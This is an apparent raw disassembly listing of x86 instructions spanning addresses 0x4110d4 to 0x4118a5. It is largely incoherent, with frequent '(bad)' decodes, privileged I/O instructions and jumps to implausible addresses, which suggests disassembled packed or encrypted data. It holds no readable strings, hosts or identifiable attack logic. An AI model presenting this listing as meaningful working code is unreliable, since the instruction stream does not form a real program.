  4110d4:	fld    st(4)
  4110d6:	cmp    bl,bh
  4110d8:	and    eax,0x6976b5ac
  4110dd:	scas   al,BYTE PTR es:[edi]
  4110de:	push   edi
  4110df:	aaa    
  4110e0:	fst    DWORD PTR ds:0xe83045f8
  4110e6:	scas   eax,DWORD PTR es:[edi]
  4110e7:	icebp  
  4110e8:	sahf   
  4110e9:	adc    DWORD PTR [ebp-0x3b1bc8f6],eax
  4110ef:	mov    eax,0x8d1c1150
  4110f4:	pop    ebp
  4110f5:	xchg   edi,ebx
  4110f7:	adc    cl,bl
  4110f9:	out    dx,al
  4110fa:	cmp    ecx,DWORD PTR [ebp+0x3997b9cd]
  411100:	jmp    0xf83f2602
  411105:	ds adc eax,0x929def18
  41110b:	xchg   ebp,eax
  41110c:	xor    dl,bl
  41110e:	push   edi
  41110f:	jnp    0x411176
  411111:	int    0x64
  411113:	and    cl,dl
  411115:	popf   
  411116:	sbb    eax,0x850c50d1
  41111b:	test   al,0x1d
  41111d:	or     esi,DWORD PTR [ecx-0xb]
  411120:	dec    esp
  411121:	mov    ds:0xccbe5bf0,al
  411126:	stos   BYTE PTR es:[edi],al
  411127:	neg    BYTE PTR [edx]
  411129:	pop    ebx
  41112a:	mov    ebp,DWORD PTR [esi-0x35b675a7]
  411130:	xchg   ebx,eax
  411131:	and    DWORD PTR [edx],eax
  411133:	adc    al,0x11
  411135:	loope  0x411117
  411137:	pusha  
  411138:	push   0x2c
  41113a:	and    bh,ah
  41113c:	ficom  DWORD PTR [ebx+0x22]
  41113f:	cmp    DWORD PTR [ebx],esp
  411141:	stc    
  411142:	leavew 
  411144:	test   BYTE PTR [ecx+0x77],bh
  411147:	fs shr ch,0xc4
  41114b:	popa   
  41114c:	xor    bh,ch
  41114e:	hlt    
  41114f:	jmp    0x411130
  411151:	std    
  411152:	and    bh,bh
  411154:	int    0xd5
  411156:	lods   al,BYTE PTR ds:[esi]
  411157:	push   edx
  411158:	sub    eax,0x2d93122e
  41115d:	mov    ah,0xfc
  41115f:	cmp    dh,dl
  411161:	mov    cl,0xe1
  411163:	lea    esi,[edx]
  411165:	popa   
  411166:	inc    ecx
  411167:	pop    ecx
  411168:	xchg   ebp,eax
  411169:	cmp    BYTE PTR [ebx+0xd951fe1],0xa9
  411170:	dec    ecx
  411171:	int3   
  411172:	sahf   
  411173:	pminsw mm5,QWORD PTR [esi-0x11763f5c]
  41117a:	sub    al,0x7f
  41117c:	scas   eax,DWORD PTR es:[edi]
  41117d:	or     al,0x7b
  41117f:	mov    bh,0x14
  411181:	pop    es
  411182:	das    
  411183:	ins    DWORD PTR es:[edi],dx
  411184:	loop   0x4111b2
  411186:	sbb    dh,BYTE PTR [edi+0x4ce7be3c]
  41118c:	lock xchg ebx,eax
  41118e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41118f:	jp     0x4111db
  411191:	or     esi,DWORD PTR [eax+0x57874344]
  411197:	add    cl,BYTE PTR [ecx+0x5fb269ca]
  41119d:	loope  0x41120d
  41119f:	dec    ecx
  4111a0:	mov    ecx,0xe40f5c14
  4111a5:	jns    0x411203
  4111a7:	push   ds
  4111a8:	ja     0x41118f
  4111aa:	mov    WORD PTR ss:[esi-0x38],es
  4111ae:	xchg   edi,eax
  4111af:	pop    ds
  4111b0:	mov    ebp,0x2301bd66
  4111b5:	(bad)  
  4111b6:	push   ds
  4111b7:	loopne 0x41113a
  4111b9:	adc    eax,0xb92d07f7
  4111be:	jmp    0x411206
  4111c0:	pop    edi
  4111c1:	and    cl,dh
  4111c3:	test   ch,0x38
  4111c6:	lods   al,BYTE PTR ds:[esi]
  4111c7:	test   bl,ah
  4111c9:	popa   
  4111ca:	fs leave 
  4111cc:	inc    ebp
  4111cd:	inc    ecx
  4111ce:	iret   
  4111cf:	add    BYTE PTR [ecx],bl
  4111d1:	jecxz  0x411200
  4111d3:	push   ecx
  4111d4:	mov    ebp,0x9f28867b
  4111d9:	xchg   edx,eax
  4111da:	add    esp,edi
  4111dc:	ja     0x41124e
  4111de:	test   DWORD PTR [ebx+0x5d94131a],edx
  4111e4:	enter  0x567c,0x63
  4111e8:	push   edx
  4111e9:	test   ecx,ebx
  4111eb:	sbb    dh,BYTE PTR [eax+edx*1-0x69c2ce96]
  4111f2:	shr    esi,cl
  4111f4:	jns    0x411183
  4111f6:	popf   
  4111f7:	jecxz  0x411205
  4111f9:	int3   
  4111fa:	(bad)  [eax+0x62]
  4111fd:	into   
  4111fe:	out    dx,eax
  4111ff:	cmp    eax,0x96c588d2
  411204:	xchg   edx,eax
  411205:	jb     0x411249
  411207:	xor    dl,BYTE PTR [ebx-0x4e758327]
  41120d:	sar    DWORD PTR [esp+edi*8+0x40],cl
  411211:	sub    eax,esi
  411213:	adc    DWORD PTR [eax+0x62],ebp
  411216:	pop    ecx
  411217:	daa    
  411218:	sar    DWORD PTR ss:[edi+0x53bee7e5],1
  41121f:	loopne 0x4111bc
  411221:	scas   al,BYTE PTR es:[edi]
  411222:	xor    al,0x65
  411224:	xor    eax,0xba42d64f
  411229:	cmp    ch,dh
  41122b:	aaa    
  41122c:	or     BYTE PTR [ecx+edi*2+0x7e39ff68],0x94
  411234:	and    eax,0x5df3f2f4
  411239:	or     BYTE PTR [edi+0x495d5ae],bl
  41123f:	adc    ecx,DWORD PTR [edi+eax*1-0x44]
  411243:	pop    eax
  411244:	clc    
  411245:	add    BYTE PTR [eax-0x207b1489],dl
  41124b:	jns    0x411206
  41124d:	sbb    DWORD PTR [ecx+eax*8-0x55],edx
  411251:	loope  0x411256
  411253:	xlat   BYTE PTR ds:[ebx]
  411254:	pop    es
  411255:	push   esi
  411256:	mov    cl,0xde
  411258:	sar    ebp,1
  41125a:	inc    eax
  41125b:	pop    esp
  41125c:	loop   0x4111fd
  41125e:	or     eax,DWORD PTR [ecx+edx*8+0x501e457c]
  411265:	cmp    eax,0x7dfffd81
  41126a:	rol    DWORD PTR [eax],cl
  41126c:	les    edi,FWORD PTR [ebx-0x74]
  41126f:	mov    DWORD PTR [esi+0x66bbb801],0xca0505b9
  411279:	rcl    BYTE PTR [edx],cl
  41127b:	sub    DWORD PTR [eax+0x49],0x6b3a17a
  411282:	push   eax
  411283:	int3   
  411284:	test   eax,0x839a0fd9
  411289:	lea    ebp,[eax]
  41128b:	cmp    DWORD PTR [ebx],esp
  41128d:	popa   
  41128e:	inc    edx
  41128f:	pmulhuw mm7,mm7
  411292:	fsubrp st(3),st
  411294:	pop    es
  411295:	in     al,dx
  411296:	mov    esi,0x3ac098a2
  41129b:	(bad)  
  41129c:	aas    
  41129d:	pop    esi
  41129e:	push   0x1c
  4112a0:	mov    eax,ds:0x482a682e
  4112a5:	lea    ebp,[esi-0x23393e22]
  4112ab:	aad    0xc8
  4112ad:	push   cs
  4112ae:	mov    DWORD PTR [eax+0x5],0x3b69f9de
  4112b5:	push   eax
  4112b6:	jno    0x4112ec
  4112b8:	push   edi
  4112b9:	int3   
  4112ba:	mov    al,ds:0x99add41a
  4112bf:	mov    DWORD PTR [edx-0x719cded8],eax
  4112c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112c6:	aas    
  4112c7:	(bad)  
  4112c8:	push   ebx
  4112c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112ca:	call   0x60b8:0x41a17942
  4112d1:	dec    edi
  4112d2:	ja     0x411333
  4112d4:	push   ebx
  4112d5:	sahf   
  4112d6:	sbb    eax,0xae6a13f2
  4112db:	cmp    al,0x21
  4112dd:	es push edx
  4112df:	pop    ebx
  4112e0:	mov    WORD PTR [ebp-0x34a3f4cc],?
  4112e6:	push   ebx
  4112e7:	jge    0x4112ef
  4112e9:	aaa    
  4112ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112eb:	pushf  
  4112ec:	(bad)
  4112ef:	and    edi,DWORD PTR [esp+edi*4]
  4112f2:	(bad)  
  4112f3:	jl     0x41129f
  4112f5:	inc    esi
  4112f6:	popf   
  4112f7:	push   ebp
  4112f8:	dec    ebp
  4112f9:	(bad)  
  4112fa:	xor    ebx,ecx
  4112fc:	cmp    edx,esi
  4112fe:	add    bl,BYTE PTR [ecx]
  411300:	mov    dh,0x15
  411302:	mov    ebx,0x4555bcdb
  411307:	loope  0x4112e7
  411309:	push   edi
  41130a:	cmp    cl,bl
  41130c:	pusha  
  41130d:	imul   esp,esi,0x454436e1
  411313:	xor    BYTE PTR [ebx],dl
  411315:	ror    DWORD PTR [eax-0x3203327d],cl
  41131b:	jmp    0x4067d500
  411320:	mov    ch,0xce
  411322:	pop    esp
  411323:	popf   
  411324:	inc    ecx
  411325:	fistp  WORD PTR [edx+0x699b39d1]
  41132b:	scas   eax,DWORD PTR es:[edi]
  41132c:	ja     0x41137c
  41132e:	sahf   
  41132f:	sub    bl,dl
  411331:	cli    
  411332:	scas   eax,DWORD PTR es:[edi]
  411333:	adc    eax,DWORD PTR [eax]
  411335:	sub    DWORD PTR [ecx-0x6bc091fb],ebp
  41133b:	(bad)  [edi-0xd]
  41133e:	push   esi
  41133f:	mov    DWORD PTR [ebx],edx
  411341:	iret   
  411342:	lahf   
  411343:	jge    0x41133c
  411345:	mov    bh,0x1b
  411347:	xchg   ebp,eax
  411348:	inc    esi
  411349:	pop    edi
  41134a:	pop    edx
  41134b:	ret    
  41134c:	push   eax
  41134d:	push   0xffffffca
  41134f:	js     0x411312
  411351:	jl     0x411393
  411353:	cli    
  411354:	or     ebx,ecx
  411356:	jne    0x411316
  411358:	add    al,0xee
  41135a:	pop    eax
  41135b:	adc    eax,0x71c1701f
  411360:	push   0x2f
  411362:	sub    eax,0x3b9f88a
  411367:	sbb    esi,DWORD PTR [ebx-0x4702a167]
  41136d:	(bad)  
  41136e:	jle    0x4113cf
  411370:	or     cl,BYTE PTR [ebp-0x51]
  411373:	leave  
  411374:	xchg   BYTE PTR [edx-0x63],al
  411377:	inc    esp
  411378:	cmp    bh,0x6e
  41137b:	xor    DWORD PTR [eax],edx
  41137d:	retf   
  41137e:	ficom  DWORD PTR [ebx+0x52]
  411381:	fldenv [ecx+ecx*4]
  411384:	mov    eax,DWORD PTR [edx+ebx*8+0x5104ef73]
  41138b:	scas   eax,DWORD PTR es:[edi]
  41138c:	nop
  41138d:	test   dh,bl
  41138f:	inc    ebx
  411390:	push   ds
  411391:	retf   0xe2d2
  411394:	mov    ecx,0x695e9a6b
  411399:	or     edx,edx
  41139b:	mov    ds:0x7b50544e,eax
  4113a0:	adc    al,0x5f
  4113a2:	cwde   
  4113a3:	cli    
  4113a4:	pop    ebx
  4113a5:	arpl   WORD PTR [esi],di
  4113a7:	rol    DWORD PTR [ebx],cl
  4113a9:	std    
  4113aa:	ficom  DWORD PTR [edx+0x68]
  4113ad:	rol    esp,0xc7
  4113b0:	jmp    0xba6e:0xf1adbf32
  4113b7:	mov    edx,0xa349fa43
  4113bc:	std    
  4113bd:	sub    cl,ah
  4113bf:	fild   WORD PTR [ebx+0x73]
  4113c2:	loopne 0x411382
  4113c4:	out    0x53,eax
  4113c6:	je     0x41139a
  4113c8:	jecxz  0x411446
  4113ca:	loope  0x4113a7
  4113cc:	std    
  4113cd:	mov    ebx,?
  4113cf:	sbb    edi,eax
  4113d1:	js     0x411392
  4113d3:	push   ss
  4113d4:	out    0xbf,eax
  4113d6:	sub    bh,BYTE PTR [ebx+edx*4]
  4113d9:	jle    0x41139c
  4113db:	dec    eax
  4113dc:	popa   
  4113dd:	int3   
  4113de:	xchg   esp,eax
  4113df:	in     al,0x9d
  4113e1:	or     BYTE PTR [ecx+edx*8],dh
  4113e4:	sbb    eax,0x260d987a
  4113e9:	sub    ecx,esp
  4113eb:	push   edi
  4113ec:	push   eax
  4113ed:	pop    ebx
  4113ee:	sbb    al,0xb8
  4113f0:	fnstsw WORD PTR [ecx+0x6c]
  4113f3:	les    edx,FWORD PTR [ebx]
  4113f5:	adc    dh,cl
  4113f7:	add    eax,0x1d40a500
  4113fc:	inc    edx
  4113fd:	pop    DWORD PTR [ebx]
  4113ff:	fsubr  QWORD PTR [edx-0x19590298]
  411405:	sub    ah,BYTE PTR [eax-0x4]
  411408:	sbb    ebp,ecx
  41140a:	or     dl,BYTE PTR ds:0xdb0ed6b8
  411410:	push   edi
  411411:	add    al,0x91
  411413:	xchg   edx,eax
  411414:	popf   
  411415:	push   ds
  411416:	test   eax,0x1e55ad0f
  41141b:	(bad)  
  41141c:	pop    ebx
  41141d:	lods   eax,DWORD PTR ds:[esi]
  41141e:	mov    bl,0x90
  411420:	call   0x7b64:0xfce2ea6a
  411427:	enter  0xb02a,0x76
  41142b:	aam    0x3d
  41142d:	(bad)  
  41142e:	or     ecx,ebx
  411430:	and    dh,BYTE PTR [ecx-0xb506c73]
  411436:	je     0x411488
  411438:	jle    0x4113d5
  41143a:	or     bh,al
  41143c:	sbb    BYTE PTR [ecx],ch
  41143e:	iret   
  41143f:	mov    esp,0xb29f0b5c
  411444:	xchg   ecx,eax
  411445:	and    al,0xa5
  411447:	bound  ecx,QWORD PTR [ecx-0x37]
  41144a:	push   0xacb52f8c
  41144f:	inc    eax
  411450:	sti    
  411451:	add    dl,ch
  411453:	out    0xa2,al
  411455:	int3   
  411456:	(bad)
  41145b:	jecxz  0x411453
  41145d:	test   esp,ebx
  41145f:	nop
  411460:	sbb    eax,0xf62ede95
  411465:	ins    DWORD PTR es:[edi],dx
  411466:	loopne 0x411434
  411468:	cmp    DWORD PTR [esi],eax
  41146a:	jno    0x4114a0
  41146c:	test   al,0xcf
  41146e:	inc    ebx
  41146f:	mov    ds:0x1663b4c8,eax
  411474:	inc    ebx
  411475:	add    eax,0x2c99c60a
  41147a:	xchg   edx,eax
  41147b:	xor    eax,0xf4c19b59
  411480:	push   edi
  411481:	mov    eax,0xb4292f5e
  411486:	sbb    ecx,edi
  411488:	xchg   DWORD PTR [eax-0x7d331896],ebp
  41148e:	mov    dl,0xdc
  411490:	imul   ebx,DWORD PTR [ebp+0x11],0xffffffd2
  411494:	imul   ebx,DWORD PTR [eax-0x78],0x67
  411498:	jns    0x411476
  41149a:	cmp    al,0xa4
  41149c:	mov    ds:0x6e1af419,eax
  4114a1:	xor    ebx,DWORD PTR [ecx+0x50]
  4114a4:	jb     0x4114fc
  4114a6:	and    ecx,DWORD PTR [edi+0x4055f8b6]
  4114ac:	stc    
  4114ad:	add    BYTE PTR [esp+eax*1],bh
  4114b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114b1:	inc    ecx
  4114b2:	adc    DWORD PTR [ebx],esp
  4114b4:	outs   dx,BYTE PTR ds:[esi]
  4114b5:	cmp    eax,0x9464dbf4
  4114ba:	shl    DWORD PTR [edi+eiz*2+0x4d],cl
  4114be:	popa   
  4114bf:	lods   eax,DWORD PTR ds:[esi]
  4114c0:	into   
  4114c1:	jnp    0x411473
  4114c3:	xchg   ebx,eax
  4114c4:	pop    ecx
  4114c5:	aad    0xc3
  4114c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114c8:	arpl   WORD PTR [edx+0x4c74e79b],bp
  4114ce:	cmp    DWORD PTR [ecx+edi*8+0x5a],edx
  4114d2:	mov    esi,0xa859fca6
  4114d7:	jo     0x4114af
  4114d9:	and    cl,BYTE PTR [edi+0x1e]
  4114dc:	sbb    al,0x9b
  4114de:	push   ds
  4114df:	(bad)  
  4114e1:	xchg   edx,eax
  4114e2:	and    BYTE PTR [edi+0x54],ch
  4114e5:	sub    ch,BYTE PTR [edi]
  4114e7:	cmc    
  4114e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114e9:	stos   DWORD PTR es:[edi],eax
  4114ea:	cmc    
  4114eb:	test   DWORD PTR [ecx],ebp
  4114ed:	jle    0x411549
  4114ef:	jge    0x41147d
  4114f1:	jns    0x41147e
  4114f3:	pusha  
  4114f4:	push   ecx
  4114f5:	inc    ecx
  4114f6:	ror    ah,0x7b
  4114f9:	jno    0x41152f
  4114fb:	push   esi
  4114fc:	pop    esi
  4114fd:	dec    edx
  4114fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114ff:	jmp    0x411505
  411501:	xor    ebp,ecx
  411503:	cmp    dh,cl
  411505:	mov    ebx,DWORD PTR [ebx]
  411507:	outs   dx,BYTE PTR ds:[esi]
  411508:	xor    BYTE PTR [eax+ebp*1+0xce29f6b],bh
  41150f:	pusha  
  411510:	lods   al,BYTE PTR ds:[esi]
  411511:	sub    BYTE PTR [ebp-0x7f],bh
  411514:	out    0x94,eax
  411516:	pop    eax
  411517:	imul   DWORD PTR [edi-0x4a]
  41151a:	pop    edx
  41151b:	jne    0x411556
  41151d:	ds das 
  41151f:	mov    esp,0xce49fc07
  411524:	fadd   DWORD PTR ds:0xe53151a6
  41152a:	add    ecx,DWORD PTR [ebp+0x7c]
  41152d:	cmp    al,dh
  41152f:	cmp    ebp,DWORD PTR [edi-0x5b8eddc1]
  411535:	test   BYTE PTR [eax],ch
  411537:	xchg   BYTE PTR [ecx+0x11],ch
  41153a:	popa   
  41153b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41153c:	or     ecx,DWORD PTR [eax-0x66]
  41153f:	mov    bh,0xc5
  411541:	add    BYTE PTR [esp+ebp*4+0x77d35914],ah
  411548:	pusha  
  411549:	popf   
  41154a:	into   
  41154b:	(bad)  
  41154c:	jns    0x4114d7
  41154e:	out    0x65,al
  411550:	mov    WORD PTR [ebp+eiz*2-0xbecdb57],fs
  411557:	ffree  st(4)
  411559:	loop   0x4114f5
  41155b:	inc    edi
  41155c:	aaa    
  41155d:	fs jno 0x41151f
  411560:	push   0xffffff83
  411562:	cmp    ch,bl
  411564:	mov    ecx,DWORD PTR [edx]
  411566:	clc    
  411567:	dec    ebp
  411568:	jmp    0x957c:0xab9e2eb3
  41156f:	adc    dh,BYTE PTR [ebx]
  411571:	add    eax,0x8eb0c626
  411576:	mov    ch,BYTE PTR [ecx-0x3f0d259e]
  41157c:	ja     0x411529
  41157e:	(bad)  
  41157f:	std    
  411580:	stos   DWORD PTR es:[edi],eax
  411581:	pop    ecx
  411582:	(bad)  gs:[ebp+0xe]
  411586:	call   0xb74ad794
  41158b:	xchg   edx,eax
  41158c:	sbb    al,0x48
  41158e:	cmp    BYTE PTR [eax+0x4b],dl
  411591:	rcr    ebx,cl
  411593:	xor    al,0x27
  411596:	add    BYTE PTR [eax],ah
  411598:	xor    DWORD PTR [edi-0x34bc9ad6],0xffffff94
  41159f:	clc    
  4115a0:	xor    eax,0xd0eb920
  4115a5:	out    0x7c,al
  4115a7:	inc    esi
  4115a8:	add    al,bh
  4115aa:	inc    edx
  4115ab:	rol    BYTE PTR ds:0xc7d0fc8c,cl
  4115b1:	pop    es
  4115b2:	mov    ds:0xfc3b5d11,al
  4115b7:	pop    ds
  4115b8:	cmp    al,BYTE PTR ds:0xfb70b1ba
  4115be:	cmp    DWORD PTR [eax],eax
  4115c0:	(bad)  
  4115c1:	push   ss
  4115c2:	ds ja  0x4115d0
  4115c5:	imul   esp,esi,0x72999419
  4115cb:	pop    edi
  4115cc:	jg     0x41162e
  4115ce:	ror    BYTE PTR [ecx-0x328ae7d2],1
  4115d4:	adc    esi,ebx
  4115d6:	pop    es
  4115d7:	and    al,0xe8
  4115d9:	dec    esi
  4115da:	ficomp WORD PTR [edi-0xa]
  4115dd:	pop    esi
  4115de:	add    dh,BYTE PTR [esi]
  4115e0:	out    0xe5,al
  4115e2:	jg     0x411662
  4115e4:	stos   DWORD PTR es:[edi],eax
  4115e5:	or     edi,DWORD PTR [edi+0x3e69f19c]
  4115eb:	imul   ebx,DWORD PTR ds:0xd4f6f634,0xe00f18e2
  4115f5:	xchg   edi,ecx
  4115f7:	sbb    al,0x74
  4115f9:	outs   dx,DWORD PTR ds:[esi]
  4115fa:	xchg   ebp,eax
  4115fb:	scas   al,BYTE PTR es:[edi]
  4115fc:	xchg   ebx,eax
  4115fd:	pop    esp
  4115fe:	push   0xffffffb6
  411600:	lds    ebp,FWORD PTR [ebx]
  411602:	sub    ecx,ebx
  411604:	jo     0x411640
  411606:	mov    cs,WORD PTR [esi]
  411608:	lods   eax,DWORD PTR ds:[esi]
  411609:	retf   0x8250
  41160c:	mov    al,0xc1
  41160e:	or     al,0x73
  411610:	inc    ecx
  411611:	mov    cl,0x72
  411613:	add    eax,0xb04dbac1
  411618:	inc    eax
  411619:	mov    dl,0xe7
  41161b:	mov    edx,0xd705d596
  411620:	adc    eax,0x6242e435
  411625:	cmp    ah,ch
  411627:	or     eax,0x1a1ad1ad
  41162c:	mov    ch,0xba
  41162e:	fisub  WORD PTR [edi]
  411630:	xchg   ecx,eax
  411631:	jns    0x411672
  411633:	mov    al,ds:0xcf8564da
  411638:	enter  0x73a8,0xc4
  41163c:	add    eax,0x863cffb3
  411641:	sbb    esp,DWORD PTR [edx]
  411643:	pusha  
  411644:	dec    ebp
  411645:	dec    ebx
  411646:	mov    ecx,0xe4516f88
  41164b:	leave  
  41164c:	sbb    BYTE PTR [edx+0x54],dh
  41164f:	test   DWORD PTR es:[ebp*1-0xe3ab04c],ebx
  411657:	add    eax,0x11a8d6e9
  41165c:	icebp  
  41165d:	dec    ebx
  41165e:	adc    ch,ah
  411660:	fidiv  WORD PTR [eax+0x9]
  411663:	push   es
  411664:	lds    eax,FWORD PTR [eax+0x18b81952]
  41166a:	(bad)  
  41166b:	add    eax,0x4f214a
  411670:	add    DWORD PTR [esi-0x246d1ebe],esi
  411676:	mov    fs,ecx
  411678:	dec    eax
  411679:	xor    BYTE PTR cs:[eax],0xac
  41167d:	aaa    
  41167e:	sbb    ecx,DWORD PTR [eax-0x5b1e3d29]
  411684:	in     al,dx
  411685:	cmp    DWORD PTR [ebx+0x70fad315],0x25
  41168c:	and    DWORD PTR [edx+eiz*1+0x74],esi
  411690:	jl     0x4116f4
  411692:	add    eax,0x445723da
  411697:	or     BYTE PTR [edi-0x41],dl
  41169a:	inc    edx
  41169b:	mov    cs,WORD PTR [edx-0x59a46de3]
  4116a1:	mov    al,ds:0xa877ff61
  4116a6:	stc    
  4116a7:	or     ecx,esi
  4116a9:	jmp    0x4116b6
  4116ab:	aad    0xc8
  4116ad:	mov    eax,ds:0xbe5bd088
  4116b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116b3:	jecxz  0x411733
  4116b5:	call   0x13e7c985
  4116ba:	jle    0x411712
  4116bc:	jge    0x4116cc
  4116be:	inc    edi
  4116bf:	hlt    
  4116c0:	pop    edx
  4116c1:	std    
  4116c2:	dec    esp
  4116c3:	pop    edx
  4116c4:	jo     0x411744
  4116c6:	sub    al,0x6d
  4116c8:	cmp    eax,0x2a3708c0
  4116cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116ce:	jne    0x411675
  4116d0:	shl    DWORD PTR [eax+0x2bd8f35e],1
  4116d6:	hlt    
  4116d7:	cdq    
  4116d8:	inc    ebx
  4116d9:	inc    esp
  4116da:	outs   dx,DWORD PTR ds:[esi]
  4116db:	xchg   esp,eax
  4116dc:	jmp    0x411685
  4116de:	and    ah,BYTE PTR [ebx]
  4116e0:	adc    edx,ecx
  4116e2:	mov    dl,0x8b
  4116e4:	ficomp DWORD PTR [edi-0x47f50876]
  4116ea:	inc    esi
  4116eb:	dec    esp
  4116ec:	jg     0x4116ba
  4116ee:	fistp  WORD PTR [eax]
  4116f0:	shl    BYTE PTR [esi-0x4],0x42
  4116f4:	retf   0xe247
  4116f7:	fld    QWORD PTR [ebx+0x3f270a61]
  4116fd:	cmc    
  4116fe:	lahf   
  4116ff:	push   edx
  411700:	lods   al,BYTE PTR ds:[esi]
  411701:	mov    edi,ebx
  411703:	fsub   QWORD PTR [esi+ebp*2+0x364de90f]
  41170a:	pop    es
  41170b:	cmp    eax,0x9b721c24
  411710:	pusha  
  411711:	inc    eax
  411712:	ror    BYTE PTR [ecx],cl
  411714:	or     eax,0x7c79a120
  411719:	ds jge 0x4116bc
  41171c:	inc    edx
  41171d:	sbb    DWORD PTR [edx],ecx
  41171f:	mov    ds:0xd68b6507,eax
  411724:	imul   eax,eax,0xcfdd39c2
  41172a:	adc    dl,BYTE PTR [ebx]
  41172c:	mov    bh,0x8d
  41172e:	std    
  41172f:	mov    eax,ds:0x9cc943c0
  411734:	in     eax,0x46
  411736:	lods   eax,DWORD PTR ds:[esi]
  411737:	pop    es
  411738:	(bad)  
  411739:	sar    BYTE PTR [ebx+eiz*1],cl
  41173c:	pop    ebp
  41173d:	push   ebp
  41173e:	jo     0x4116c1
  411740:	cmp    DWORD PTR [edx-0x5924f031],esp
  411746:	lock retf 0x7ae8
  41174a:	jmp    0xd6b3534b
  41174f:	sbb    eax,0xac4b7473
  411754:	sbb    al,0x36
  411756:	mov    eax,ds:0x4bd161ce
  41175b:	jl     0x4116ff
  41175d:	mov    fs,esp
  41175f:	xor    al,0xe8
  411761:	pop    ebx
  411762:	add    DWORD PTR [ebx-0x64],eax
  411765:	(bad)  
  411766:	adc    DWORD PTR [ebp+0x28c78029],ebp
  41176c:	stos   DWORD PTR es:[edi],eax
  41176d:	fistp  QWORD PTR [eax+esi*2-0x49132911]
  411774:	aas    
  411775:	clc    
  411776:	jg     0x41171f
  411778:	mov    ch,0x7b
  41177a:	sub    al,0xab
  41177c:	leave  
  41177d:	jns    0x411710
  41177f:	mov    ecx,0xc0069ba4
  411784:	jae    0x4117a7
  411786:	cmp    dl,dh
  411788:	jge    0x41179a
  41178a:	push   ss
  41178b:	ficom  WORD PTR [edi]
  41178d:	mov    al,0x54
  41178f:	fmul   DWORD PTR [ebp+0x6e65afa]
  411795:	adc    DWORD PTR [ecx-0x37],0x8ef339f4
  41179c:	sbb    eax,DWORD PTR [ecx+0x6]
  41179f:	imul   esp,DWORD PTR [ecx],0xffffff94
  4117a2:	aas    
  4117a3:	and    al,0xe2
  4117a5:	push   ds
  4117a6:	sahf   
  4117a7:	xchg   edx,eax
  4117a8:	mov    ebx,0x5fa2632a
  4117ad:	dec    eax
  4117ae:	and    al,0xf4
  4117b0:	sub    eax,0x13c62d37
  4117b5:	dec    BYTE PTR [esi+0x22]
  4117b8:	jle    0x411828
  4117ba:	cmpxchg ch,ah
  4117bd:	std    
  4117be:	or     bl,BYTE PTR [esi+0x7e]
  4117c1:	in     eax,0x83
  4117c3:	dec    eax
  4117c4:	shl    DWORD PTR [eax],1
  4117c6:	rol    dh,1
  4117c8:	loopne 0x4117d2
  4117ca:	and    edi,DWORD PTR [ebx-0x62]
  4117cd:	xor    DWORD PTR [edi],0x6c7c42f7
  4117d3:	push   0xd6063bcb
  4117d8:	pop    eax
  4117d9:	(bad)  
  4117da:	not    BYTE PTR [eax+0x6a]
  4117dd:	ret    0x8600
  4117e0:	das    
  4117e1:	pop    edi
  4117e2:	pop    edi
  4117e3:	cmp    cl,BYTE PTR [ecx-0x2f]
  4117e6:	mov    ebp,DWORD PTR [ecx]
  4117e8:	mov    BYTE PTR [edx+0x46],bl
  4117eb:	cld    
  4117ec:	push   edi
  4117ed:	ror    BYTE PTR [bp+si+0x7eca],1
  4117f2:	clc    
  4117f3:	cld    
  4117f4:	loope  0x4117f6
  4117f6:	pop    ebx
  4117f7:	and    DWORD PTR [ebx],edi
  4117f9:	add    al,0xd4
  4117fb:	cdq    
  4117fc:	loope  0x411792
  4117fe:	ja     0x4117d0
  411800:	add    BYTE PTR [ebx+0x1a8c4665],dh
  411806:	rol    DWORD PTR [edx+0x314fa234],1
  41180c:	add    eax,DWORD PTR [edx+0x29]
  41180f:	fnstenv [edi+ebp*4-0xf]
  411813:	popa   
  411814:	sbb    dh,bh
  411816:	dec    ecx
  411817:	lods   al,BYTE PTR ds:[esi]
  411818:	jp     0x41181b
  41181a:	in     eax,0x60
  41181c:	and    dl,BYTE PTR [edi]
  41181e:	xor    esi,edi
  411820:	fisttp WORD PTR [esi-0x29]
  411823:	xor    al,BYTE PTR [ebx]
  411825:	jno    0x411872
  411827:	inc    esi
  411828:	call   0xf903:0xad8f585c
  41182f:	and    eax,0x64a30b2
  411834:	pusha  
  411835:	cmp    al,0x9d
  411837:	scas   al,BYTE PTR es:[edi]
  411838:	test   ebp,esi
  41183a:	call   0xfe7231ab
  41183f:	cld    
  411840:	xor    ecx,DWORD PTR [ecx-0xd]
  411843:	and    DWORD PTR [edi+eiz*4-0x39],edx
  411847:	xor    ebx,ebx
  411849:	add    esi,ecx
  41184b:	adc    ebx,0xffffffff
  41184e:	xor    edi,edi
  411850:	xor    esi,eax
  411852:	xor    ebx,0x0
  411855:	jmp    0x413be9
  41185a:	pop    ss
  41185b:	push   edx
  41185c:	mov    al,0x83
  41185f:	aam    0xe3
  411861:	imul   ebx,DWORD PTR [eax+0x68],0xde27ba54
  411868:	clc    
  411869:	outs   dx,BYTE PTR ds:[esi]
  41186a:	hlt    
  41186b:	push   0x62
  41186d:	(bad)  
  41186e:	jmp    0x4118cf
  411870:	bound  esp,QWORD PTR [edx-0x4b]
  411873:	xor    al,0xcf
  411875:	pop    edx
  411876:	aaa    
  411877:	andnps xmm7,XMMWORD PTR [ebp+0x14dfa298]
  41187e:	inc    ecx
  41187f:	sbb    BYTE PTR [edx],al
  411881:	dec    esi
  411882:	mov    dh,0x49
  411884:	arpl   dx,di
  411886:	mov    eax,0x3a6b45c7
  41188b:	call   0xe196ed82
  411890:	jle    0x4118cf
  411892:	add    dh,dl
  411894:	aas    
  411895:	push   cs
  411896:	mov    eax,ds:0x337c59fb
  41189b:	dec    ecx
  41189c:	cli    
  41189d:	mov    eax,ds:0x58cd6012
  4118a2:	pop    eax
  4118a4:	stos   DWORD PTR es:[edi],eax
  4118a5:	cmp    eax,0x4a44c950
